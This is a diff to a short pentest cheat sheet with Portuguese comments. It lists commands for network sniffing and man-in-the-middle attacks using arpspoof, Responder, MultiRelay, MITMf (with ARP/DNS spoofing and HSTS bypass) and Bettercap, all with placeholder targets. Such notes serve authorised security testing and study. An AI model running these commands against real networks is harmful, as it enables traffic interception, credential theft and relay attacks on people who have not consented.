@@ -1,10 +1,24 @@
-% arpspoof, sniffing
-
-# instalando a suite dsnif
-sudo apt install dsniff
+% sniffing e Man in the Middle
 
 # configurando o ip_forward
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# sniffando
+# arpspoof, da suite dsniff
 sudo -s arpspoof -i <interface> -t <IP_alvo> <IP_gateway>
+
+# Responder
+python Responder.py -I <interface> --lm
+
+# MutiRelay, em paralelo com o Responder
+python MultiRelay.py -t <IP_alvo> -u ALL -d
+
+# MITMF - Man in The Middle Framework
+python mitmf.py -i eth0 --spoof --arp --dns --hsts --gateway <gateway> --targets <IP_alvo>
+
+# Bettercap
+
+bettercap -I <interface> --no-spoofing
+
+bettercap -I <interface> -T <IP_alvo>
+
+bettercap -I <interface> -G <gateway> -T <IP_alvo>
